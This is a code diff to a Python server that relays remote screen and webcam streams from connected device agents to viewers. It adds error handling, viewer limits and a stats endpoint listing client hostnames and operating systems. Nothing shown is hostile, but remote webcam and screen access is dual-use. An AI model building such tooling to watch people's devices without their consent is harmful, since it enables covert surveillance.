                     else:
                         logger.warning(f"Camera stream arrived before control connection: {device_id[:8]}...")
     except WebSocketDisconnect:
         pass
+    except Exception as ex:
+        logger.warning(f"Camera loop error ({device_id[:8] if device_id else '?'}): {ex}")
     finally:
         logger.info(f"❌ Camera stream disconnected: {device_id[:8] if device_id else '?'}...")
-        if device_id and device_id in state.clients:
-            if state.clients[device_id].camera_ws is websocket:
-                state.clients[device_id].camera_ws = None
+        if device_id:
+            session = await state.get_client(device_id)
+            if session and session.camera_ws is websocket:
+                session.camera_ws = None
 
 
 @app.websocket("/ws/viewer/{device_id}")
 async def ws_viewer(websocket: WebSocket, device_id: str):
     await websocket.accept()
-    if device_id not in state.clients:
-        await websocket.close()
+    session = await state.get_client(device_id)
+    if not session:
+        await websocket.close(code=4001, reason="No such client")
         return
-    session = state.clients[device_id]
+    if len(session.viewers) >= 10:
+        logger.warning(f"Viewer limit reached for {device_id[:8]}...")
+        await websocket.close(code=4002, reason="Max viewers reached")
+        return
     session.viewers.add(websocket)
-    logger.info(f"👁 Viewer attached to {device_id[:8]}...")
+    logger.info(f"👁 Viewer attached to {device_id[:8]}... (total: {len(session.viewers)})")
     try:
         while True:
             raw = await websocket.receive()
@@ -1287,7 +1487,8 @@ async def ws_viewer(websocket: WebSocket, device_id: str):
             kind, payload = parsed
             if kind == "skip":
                 continue
-            if device_id not in state.clients:
+            session = await state.get_client(device_id)
+            if not session:
                 break
             try:
                 if kind == "bytes":
@@ -1298,19 +1499,27 @@ async def ws_viewer(websocket: WebSocket, device_id: str):
                 break
     except WebSocketDisconnect:
         pass
+    except Exception as ex:
+        logger.warning(f"Viewer error ({device_id[:8]}...): {ex}")
     finally:
-        session.viewers.discard(websocket)
+        session = await state.get_client(device_id)
+        if session:
+            session.viewers.discard(websocket)
 
 
 @app.websocket("/ws/viewer_cam/{device_id}")
 async def ws_viewer_cam(websocket: WebSocket, device_id: str):
     await websocket.accept()
-    if device_id not in state.clients:
-        await websocket.close()
+    session = await state.get_client(device_id)
+    if not session:
+        await websocket.close(code=4001, reason="No such client")
         return
-    session = state.clients[device_id]
+    if len(session.cam_viewers) >= 5:
+        logger.warning(f"Cam viewer limit reached for {device_id[:8]}...")
+        await websocket.close(code=4002, reason="Max cam viewers reached")
+        return
     session.cam_viewers.add(websocket)
-    logger.info(f"👁 Webcam viewer attached to {device_id[:8]}...")
+    logger.info(f"👁 Webcam viewer attached to {device_id[:8]}... (total: {len(session.cam_viewers)})")
     try:
         if session.ws:
             try:
@@ -1322,7 +1531,8 @@ async def ws_viewer_cam(websocket: WebSocket, device_id: str):
             parsed = _ws_payload(raw)
             if parsed is None:
                 break
-            if device_id not in state.clients:
+            session = await state.get_client(device_id)
+            if not session:
                 break
             kind, payload = parsed
             if kind == "skip":
@@ -1336,13 +1546,17 @@ async def ws_viewer_cam(websocket: WebSocket, device_id: str):
                 break
     except WebSocketDisconnect:
         pass
+    except Exception as ex:
+        logger.warning(f"Cam viewer error ({device_id[:8]}...): {ex}")
     finally:
-        session.cam_viewers.discard(websocket)
-        if not session.cam_viewers and session.ws:
-            try:
-                await session.agent_send_text(json.dumps({"cmd": CMD_VIEW, "args": {"substream": "cam", "enabled": False}}))
-            except Exception:
-                pass
+        session = await state.get_client(device_id)
+        if session:
+            session.cam_viewers.discard(websocket)
+            if not session.cam_viewers and session.ws:
+                try:
+                    await session.agent_send_text(json.dumps({"cmd": CMD_VIEW, "args": {"substream": "cam", "enabled": False}}))
+                except Exception:
+                    pass
 
 
 @app.get("/")
@@ -1356,8 +1570,28 @@ async def root():
 
 @app.get("/clients")
 async def get_clients():
-    out = {cid: s.info for cid, s in state.clients.items()}
-    return out
+    return {cid: s.info for cid, s in state.clients.items()}
+
+
+@app.get("/stats")
+async def get_stats():
+    clients = state.clients
+    total_viewers = sum(len(s.viewers) + len(s.cam_viewers) for s in clients.values())
+    return {
+        "active_clients": len(clients),
+        "total_viewers": total_viewers,
+        "uptime": time.time() - _start_time if '_start_time' in dir() else 0,
+        "clients": {
+            cid: {
+                "hostname": s.info.get("hostname", "?"),
+                "os": s.info.get("os", "?")[:40],
+                "connected_for": int(time.time() - s.created),
+                "viewers": len(s.viewers),
+                "cam_viewers": len(s.cam_viewers),
+            }
+            for cid, s in clients.items()
+        },
+    }
 
 
 def _load_network_config():
@@ -1422,6 +1656,10 @@ async def server_logs(lines: int = 100):
 
 
 if __name__ == "__main__":
+    if len(sys.argv) > 1 and sys.argv[1] in ("--gui", "-g", "--dashboard-gui"):
+        from dashboard_host import main as _dashboard_main
+
+        raise SystemExit(_dashboard_main(sys.argv[2:]) or 0)
     host = os.environ.get("HOST", "127.0.0.1")
     port = int(os.environ.get("PORT", "8080"))
     uvicorn.run(
